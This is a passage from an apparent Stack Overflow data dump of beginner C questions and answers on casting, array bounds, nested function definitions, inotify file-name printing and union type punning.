"https://stackoverflow.com/users/11156242/antonio-martins"}, "reply_to_user": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1551820698, "post_id": 55011445, "comment_id": 96778216, "body": "Yes of course! Thank you very much!"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551980589, "post_id": 55011445, "comment_id": 96849739, "body": "the posted code does not compile!.  The compiler outputs several ERROR messages and some warning messages.   Please correct.  One of the errors is on this statement: <code>scanf(&quot;%d&quot;, &amp;n)</code> which is missing the trailing semicolon &#39;;&#39;"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551980904, "post_id": 55011445, "comment_id": 96849895, "body": "OT: regarding: <code>#include &lt;stdio.h&gt; #include &lt;stdio.h&gt;</code>  There is absolutely no need to include a header file more than once.  Infact header files (include the system headers) have &#39;include guards&#39; so their contents will only be included once, regardless of how many times there is a <code>#include</code> statement for a header"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551981045, "post_id": 55011445, "comment_id": 96849964, "body": "OT: indenting of the code is for human readability.  an indent of 2 spaces will be hidden when using variable width fonts.  Suggest each indent level be 4 spaces"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551981248, "post_id": 55011445, "comment_id": 96850053, "body": "OT: regarding: <code>scanf(&quot;%d&quot;, &amp;n)</code> and <code>scanf(&quot;%lf&quot;, &amp;value);</code>  Always check the returned value (not the parameter values) to assure the operation was successful.  I.E.  <code>if( scanf(&quot;%lf&quot;, &amp;value) != 1 ) { fprintf( stderr, &quot;scanf failed\\n&quot; ); exit( EXIT_FAILURE ); }</code>"}], "answers": [{"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1551821786, "post_id": 55011493, "comment_id": 96778672, "body": "Note that C++ supports the <code>int(r)</code> notation, or at least it did once upon a while ago (say C++98); it may have been deprecated, but I doubt if it has been removed yet.  C has never supported that notation, though."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1551819606, "creation_date": 1551819606, "answer_id": 55011493, "question_id": 55011445, "link": "https://stackoverflow.com/questions/55011445/expected-expression-c/55011493#55011493", "title": "Expected Expression C", "body": "<p>This</p>\n\n<pre><code>int(r)\n</code></pre>\n\n<p>Is not valid syntax to cast a value to an <code>int</code>.  It is done as follows:</p>\n\n<pre><code>(int)r\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 11156242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3134484df14b5bce5a36c181825d6a2?s=128&d=identicon&r=PG&f=1", "display_name": "Antonio Martins", "link": "https://stackoverflow.com/users/11156242/antonio-martins"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "accepted_answer_id": 55011493, "answer_count": 1, "score": 1, "last_activity_date": 1551819606, "creation_date": 1551819411, "last_edit_date": 1551819537, "question_id": 55011445, "link": "https://stackoverflow.com/questions/55011445/expected-expression-c", "title": "Expected Expression C", "body": "<p>I'm currently developing a code for university which rounds a number, but without using math library in c.</p>\n\n<p>Here's what I did:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ndouble arrd(double x, int n);\n\nint main()\n{\n    double value;\n    int n;\n    printf(\"Insert a value: \")\n    scanf(\"%lf\", &amp;value);\n    printf(\"Insert n: \");\n    scanf(\"%d\", &amp;n)\n\n\n    printf (\"%f\", arrd( value, n));\n    return 0;\n}\n\ndouble arrd(double x, int n){\n   double r = x;\n   double s = 1;\n   int e = 0;\n   while (e != (n+1)){ /*This is to get to the last number before rounding*/\n    s= s * 10;\n    r = r*10 - int(r); /*This is where is giving me the error*/\n    e++;\n   };\n   r=r*10;\n   if (r&lt;5){\n    return x-r*(1/s);\n   } else {\n    return x-r*(1/s)+(10/s);\n   }\n\n}\n</code></pre>\n\n<p>It says that is expecting expression, in r = r*10 - int(r). What should I do?\nI'm new to programming, but if there's anything wrong with the rest of the code where I can improve, let me know.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1551818943, "post_id": 55011319, "comment_id": 96777405, "body": "I would suggest to take the input as a string. Will simplify it significantly."}, {"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 1, "creation_date": 1551819105, "post_id": 55011319, "comment_id": 96777469, "body": "Note: all that is needed to check if a number is divisible by two is <code>n &amp; 1 == 0</code>"}, {"owner": {"reputation": 348, "user_id": 2514266, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a21f7ff53d93d0c5f11c95d38c96b132?s=128&d=identicon&r=PG", "display_name": "Rohan", "link": "https://stackoverflow.com/users/2514266/rohan"}, "edited": false, "score": 0, "creation_date": 1551819709, "post_id": 55011319, "comment_id": 96777745, "body": "You&#39;re breaking from your last loop when the first digit appears to be divisible by 2. You want to print that the code is valid after all iterations have passed the test."}, {"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1551820591, "post_id": 55011319, "comment_id": 96778162, "body": "@EugeneSh. Agreed :) - See my answer"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 0, "creation_date": 1551821441, "post_id": 55011319, "comment_id": 96778546, "body": "@GovindParmar Well, you have taken it to the extreme :)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1551824013, "post_id": 55011319, "comment_id": 96779567, "body": "Using the label <code>TOP</code> and <code>goto TOP;</code> is generally not regarded as a good idea.  Use an explicit <code>while</code> or <code>for</code> loop instead. In limited circumstances, branching forwards to go to an exit or error handling label is fine.  Using <code>goto</code> to form a loop is not such a good idea."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551984036, "post_id": 55011319, "comment_id": 96851347, "body": "regarding: <code>because 1,2,3,5 isn&#39;t divisible by 2</code>  Actually, the 2 is divisible by 2. So there is a bad assumption in the premise for the algorithm"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551984265, "post_id": 55011319, "comment_id": 96851445, "body": "what if the user only enters 5 (or less) digits or enters 7 (or more) digits?  the posted code does not check for these unexpected conditions.  I.E. never trust the user to do the right thing"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551984490, "post_id": 55011319, "comment_id": 96851544, "body": "regarding: <code>if (digits[N] &gt; 6) {</code>  In C, the valid offsets in an array are 0...(number of elements in array -1).  So <code>digits[N]</code> is accessing 1 past the end of the array.  The result is undefined behavior and can lead to a seg fault event"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551984599, "post_id": 55011319, "comment_id": 96851584, "body": "regarding: <code>for (i = 6; i &gt;= 0; i--) {</code>  When &#39;i&#39; is 6, this is accessing beyond the end of the array: <code>digits[]</code>  The result is undefined behavior and can lead to a seg fault event"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551984978, "post_id": 55011319, "comment_id": 96851744, "body": "it is good programming practice to limit the scope of a variable as much as possible.  Therefore, this statement: <code>int ..., i, ...;</code> should have the &#39;i&#39; variable removed and change statements like: <code>for (i = 0; i &lt; 6; i++) {</code> to <code>for ( int i = 0; i &lt; 6; i++ ) {</code>"}], "answers": [{"comments": [{"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1551820455, "post_id": 55011360, "comment_id": 96778091, "body": "I would mention that if you count down the way you did, <code>i</code> must always be <code>signed</code> number otherwise you end up in dead-end (in this case this is ok as <code>i</code> is <code>int</code>). To avoid such scenario, <code>for (i = 6, i &gt; 0; i--)</code> and then <code>digits[i - 1] = num % 10;</code>."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 2, "last_activity_date": 1551819069, "creation_date": 1551819069, "answer_id": 55011360, "question_id": 55011319, "link": "https://stackoverflow.com/questions/55011319/checking-if-each-digit-is-divisible-by-2/55011360#55011360", "title": "Checking if each digit is divisible by 2", "body": "<p>There's a problem with how you're storing the digits:</p>\n\n<pre><code>for (i = 6; i &gt;= 0; i--) {\n    digits[i] = num % 10;\n    num = num / 10; \n}\n</code></pre>\n\n<p>The length of the array <code>digits</code> is 6, meaning that valid indexes go from 0 to 5, but you start reading into index 6.  This writes past the bounds of the array invoking <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>Change the loop to start at 5.</p>\n\n<pre><code>for (i = 5; i &gt;= 0; i--) {\n    digits[i] = num % 10;\n    num = num / 10; \n}\n</code></pre>\n\n<p>This check is also invalid:</p>\n\n<pre><code>if (digits[N] &gt; 6) {\n</code></pre>\n\n<p>Because it again reads past the end of the array.  Even if it did not read past the end, you're checking if an element of the array is greater than 6, not if there are more than 6 digits.</p>\n\n<p>You divide <code>num</code> by 10 in a loop to get the digits, so if this value is non zero then you know there are too many digits.</p>\n\n<pre><code>if (num &gt; 0) {\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "is_accepted": false, "score": 4, "last_activity_date": 1551823786, "last_edit_date": 1551823786, "creation_date": 1551819856, "answer_id": 55011546, "question_id": 55011319, "link": "https://stackoverflow.com/questions/55011319/checking-if-each-digit-is-divisible-by-2/55011546#55011546", "title": "Checking if each digit is divisible by 2", "body": "<p>If you are permitted to process the input as a string, rather than an integer, all that is needed is <a href=\"http://www.cplusplus.com/reference/cstring/strspn/\" rel=\"nofollow noreferrer\"><code>strspn</code></a> to determine the validity of the digits in the pin and <a href=\"http://www.cplusplus.com/reference/cstring/strlen/\" rel=\"nofollow noreferrer\"><code>strlen</code></a> to determine the validity of the length:</p>\n\n<pre><code>#include &lt;string.h&gt;\n\nsize_t len = strlen(str_pin);\nif (len &lt;= 6 &amp;&amp; strspn(str_pin, \"24680\") == len)\n{\n    puts(\"Valid pin\");\n}\nelse\n{\n    puts(\"Invalid pin\");\n}\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 11156264, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6414a192b2e2b63e3090825b037272af?s=128&d=identicon&r=PG&f=1", "display_name": "asas", "link": "https://stackoverflow.com/users/11156264/asas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1551907771, "creation_date": 1551818877, "last_edit_date": 1551907771, "question_id": 55011319, "link": "https://stackoverflow.com/questions/55011319/checking-if-each-digit-is-divisible-by-2", "title": "Checking if each digit is divisible by 2", "body": "<p>I am writing a C program to ask the user to enter in a pin code and checks if each digit in the number is divisible by 2. For instance, if they enter 123452 it tells the user that it is wrong because 1,2,3,5 isn't divisible by 2. If I enter 642642 it says it is fine but if I enter in 622248 it displays invalid number, which is wrong because every digit in 622248 is divisible by 2. How can I fix this error?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define N 6 \n\nint main(void)\n{\n    int num, digits[N], i, invalid, count = 1, sum = 0;\n\n    TOP:\n    printf(\"Enter pin code (attempt %d): \", count++);\n    scanf(\"%d\", &amp;num);\n\n    invalid = num;\n    // stores each digit of the number entered into the the array\n    for (i = 6; i &gt;= 0; i--) {\n        digits[i] = num % 10;\n        num = num / 10; \n    }\n    // if the user enters more than 6 digits than it will give you an error.\n    if (digits[N] &gt; 6) {\n       printf(\"Code %d is invalid!\\n\", invalid); \n       goto TOP;\n    } \n    // loops through the array elements and see if each digit is divisble by 2, if not then print an error.\n    for (i = 0; i &lt; 6; i++) {\n        if (digits[i] % 2 != 0) {\n            printf(\"Code %d is invalid!\\n\", invalid); \n            goto TOP;\n        }\n        else {\n            printf(\"Congratulation, code %d is valid!\\n\", invalid);\n            break;\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "function", "hash", "compiler-errors"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1551818609, "post_id": 55011238, "comment_id": 96777248, "body": "Function definitions should be outside of <code>main</code> (or any other function)."}, {"owner": {"reputation": 201, "user_id": 8519006, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11cb821618b0fb973e916ffdf2e0d023?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/8519006/mike"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1551818784, "post_id": 55011238, "comment_id": 96777327, "body": "Easy fix to my code, thanks"}], "answers": [{"tags": [], "owner": {"reputation": 249903, "user_id": 2422776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2353050223ebecb113741c29458de4b2?s=128&d=identicon&r=PG", "display_name": "Mureinik", "link": "https://stackoverflow.com/users/2422776/mureinik"}, "is_accepted": false, "score": 1, "last_activity_date": 1551818670, "creation_date": 1551818670, "answer_id": 55011268, "question_id": 55011238, "link": "https://stackoverflow.com/questions/55011238/how-insert-word-into-simple-hash-function-c/55011268#55011268", "title": "How insert word into simple hash function C", "body": "<p>As the error message suggests, you're defining a function in a place you aren't supposed to - in this case, inside the <code>main</code> function. Move it out of there and you should be OK.</p>\n"}], "owner": {"reputation": 201, "user_id": 8519006, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11cb821618b0fb973e916ffdf2e0d023?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/8519006/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 155, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1551818870, "creation_date": 1551818535, "last_edit_date": 1551818870, "question_id": 55011238, "link": "https://stackoverflow.com/questions/55011238/how-insert-word-into-simple-hash-function-c", "title": "How insert word into simple hash function C", "body": "<p>Noob, trying to figure out how to insert 1 word into a simple hash table (which is given). The word is lowercase. However, I'm getting the following error:</p>\n\n<pre><code>\"\"exit status 1\nmain.c:30:40: error: function definition is not allowed here\n    unsigned int hash(const char *word){\"\"\n</code></pre>\n\n<p><br/></p>\n\n<pre><code>#include &lt;ctype.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n\nint main(void) {\n    int N = 26;\n    // Length = 45;\n\n    // Represents a node in a hash table\n    typedef struct node\n    {\n        // LENGTH is defined in dictionary.h as 45, max length\n        char word[45+1];\n        struct node *next;\n    }\n    node;\n\n    // Represents a hash table, N is defined as 26 above\n    node *hashtable[N];\n\n    // Initialize hash table\n    for (int i = 0; i &lt; N; i++)\n    {\n        hashtable[i] = NULL;\n    }\n\n    char *word = \"jello\";\n\n    // Hashes word to a number between 0 (a) and 25 (z), inclusive, based on its first letter, creating 26 buckets, or alphabetized categories\n\n    unsigned int hash(const char *word){\n        return tolower(word[0]) - 'a';\n    }\n\n    int x = word[0] - 'a';\n\n    printf(\"%d\\n\", x);\n    printf(\"%s\\n\", word);\n    printf(\"%c\\n\", word[0]);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "loops", "inotify"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551982529, "post_id": 55011006, "comment_id": 96850625, "body": "the posted code causes the compiler (gcc) to output lots of warnings about implicit type conversions and about unused variables.  It also discusses where the variable <code>wd</code> is set but never used.  When compiling, always enable the warnings, then fix those warnings.  ( for <code>gcc</code>, at a minimum use: <code>-Wall -Wextra -Wconversion -pedantic -std=gnu11</code> )  Note: other compilers use different options to produce the same thing"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1551818150, "creation_date": 1551818150, "answer_id": 55011155, "question_id": 55011006, "link": "https://stackoverflow.com/questions/55011006/how-to-print-name-of-newly-created-files-within-a-directory-in-c/55011155#55011155", "title": "how to print name of newly created file(s) within a directory in C?", "body": "<p>You're printing out <code>target</code> when you get an event, however <code>target</code> is never modified.</p>\n\n<p>The name of the created file is stored in <code>event-&gt;name</code>.  That's what you want to print.</p>\n\n<pre><code>printf(\"The file %s has been created\\n\", event-&gt;name);\n</code></pre>\n"}], "owner": {"reputation": 111, "user_id": 10101999, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-pl3qk8GrXWE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7qlnwZBhFZgnLt-IVbl-NOzKF6YtQ/mo/photo.jpg?sz=128", "display_name": "Joseph Smith", "link": "https://stackoverflow.com/users/10101999/joseph-smith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 55011155, "answer_count": 1, "score": 0, "last_activity_date": 1551818150, "creation_date": 1551817561, "question_id": 55011006, "link": "https://stackoverflow.com/questions/55011006/how-to-print-name-of-newly-created-files-within-a-directory-in-c", "title": "how to print name of newly created file(s) within a directory in C?", "body": "<p>This code scans for newly created files within a directory, however where \"%s\" should contain the name of the new file(s) this does not occur. </p>\n\n<p>I can imagine there are unnecessary pieces of code written here, however being quite unfamiliar with C I'm simply happy it compiles at this point (and actually recognizes new files) ! </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;string.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/inotify.h&gt;\n\nint main (int argc, char *argv[])\n{\n        char target[FILENAME_MAX];\n        int result;\n        int fd;\n        int wd; /* watch descriptor */\n        const int event_size = sizeof(struct inotify_event);\n        const int buf_len = 1024 * (event_size + FILENAME_MAX);\n\n        fd = inotify_init();\n\n        if (fd &lt; 0) {\n                perror(\"inotify_init\");\n        }\n\n        wd = inotify_add_watch(fd, \"/home/joe/Documents\", IN_CREATE);\n\n        while (1) {\n                char buff[buf_len];\n                int no_of_events, count = 0;\n\n                no_of_events = read (fd, buff, buf_len);\n\n                while (count &lt; no_of_events) {\n                        struct inotify_event *event = (struct inotify_event *)&amp;buff[count];\n\n                        if (event-&gt;len) {\n                                if (event-&gt;mask &amp; IN_CREATE)\n                                        if(!(event-&gt;mask &amp; IN_ISDIR)) {\n                                                printf(\"The file %s has been created\\n\", target);\n                                                fflush(stdout);\n                                        }\n                        }\n                        count += event_size + event-&gt;len;\n                }\n        }\n\n        return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "unions", "type-punning"], "comments": [{"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 2, "creation_date": 1551817010, "post_id": 55010795, "comment_id": 96776539, "body": "Yes, but be aware of endianness."}, {"owner": {"reputation": 2823, "user_id": 6872717, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UCuzs.png?s=128&g=1", "display_name": "alx", "link": "https://stackoverflow.com/users/6872717/alx"}, "reply_to_user": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 0, "creation_date": 1551817974, "post_id": 55010795, "comment_id": 96776958, "body": "I thought about that, but as I&#39;m only counting bits, I don&#39;t care."}], "answers": [{"comments": [{"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1551824169, "post_id": 55010864, "comment_id": 96779611, "body": "According to the Standard, <code>someUnion.arr[i]</code> is equivalent to <code>*(someUnion.arr+i)</code>.  Given that clang doesn&#39;t treat the latter as defined, is there any reason to trust it to process the former?"}], "tags": [], "owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "is_accepted": false, "score": 5, "last_activity_date": 1551822858, "last_edit_date": 1551822858, "creation_date": 1551816951, "answer_id": 55010864, "question_id": 55010795, "link": "https://stackoverflow.com/questions/55010795/type-punning-between-integer-and-array-using-union/55010864#55010864", "title": "Type punning between integer and array using `union`?", "body": "<p>Yes, type punning between all the data types through unions is explicitly foreseen by the C standard. There are no special provisions for arrays that would forbid that.</p>\n"}, {"tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": false, "score": 3, "last_activity_date": 1551824771, "last_edit_date": 1551824771, "creation_date": 1551824034, "answer_id": 55012433, "question_id": 55010795, "link": "https://stackoverflow.com/questions/55010795/type-punning-between-integer-and-array-using-union/55012433#55012433", "title": "Type punning between integer and array using `union`?", "body": "<p>Yes, union type-punning is legal in ISO C99 and later. <a href=\"https://stackoverflow.com/questions/25664848/unions-and-type-punning\">Unions and type-punning</a>\nand also  <a href=\"https://stackoverflow.com/questions/11639947/is-type-punning-through-a-union-unspecified-in-c99-and-has-it-become-specified\">Is type-punning through a union unspecified in C99, and has it become specified in C11?</a>  (In C89 it was <em>implementation defined</em>, not <em>undefined</em>).</p>\n\n<p>As a GNU extension, it's well-defined in gnu89 and GNU C++.  <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html#Type%2Dpunning\" rel=\"nofollow noreferrer\">https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html#Type%2Dpunning</a></p>\n\n<p>It's also legal in MSVC++, which for example uses unions to define <code>__m128i</code> for access to vector elements.  (And also allows pointer-casting for type punning, unlike other compilers that enforce strict aliasing.)</p>\n\n<hr>\n\n<p><strong>Beware that it's <em>not</em> legal in ISO C++</strong> to read a union member other than the one that was last written (undefined behaviour).  It is a common extension that I think all x86 compilers support (and you're using Intel intrinsics), but not all compilers everywhere should be assumed to.</p>\n\n<p><strong>You can always use <code>memcpy</code> for strictly-portable C++</strong> to copy between the object-representations of two different types.</p>\n\n<hr>\n\n<p>For your case, any decent optimizing compiler <em>should</em> compile this the same as <code>(uint64_t)n</code> and <code>n&gt;&gt;64</code>, unless you disable optimization.</p>\n"}, {"tags": [], "owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "is_accepted": true, "score": 0, "last_activity_date": 1551825014, "creation_date": 1551825014, "answer_id": 55012635, "question_id": 55010795, "link": "https://stackoverflow.com/questions/55010795/type-punning-between-integer-and-array-using-union/55012635#55012635", "title": "Type punning between integer and array using `union`?", "body": "<p>The type-access rules in section 6.5 paragraph C of C11 draft N1570 make no provision for an object of <code>struct</code> or <code>union</code> type to have its storage accessed by anything other than an lvalue of that <code>union</code> type, an lvalue of another type that contains such a <code>union</code>, or an lvalue of character type.</p>\n\n<p>A quality compiler that can see that a pointer or lvalue of one type is being used to derive a pointer or lvalue of another which is then accessed should be able to recognize that an access to the latter, made in a context where the derivation is visible, <em>is</em> an access to the former.  I think the authors of the Standard thought that sufficiently obvious that it could go without saying, especially since even something like <code>someUnion.intMember = 3;</code> would invoke UB otherwise.  The left-hand operand of the assignment is an lvalue of type <code>int</code>, and there is no provision that would allow an lvalue of type <code>int</code> to be used to access an object of union type.  The range of situations where a compiler would recognize that an access via derived 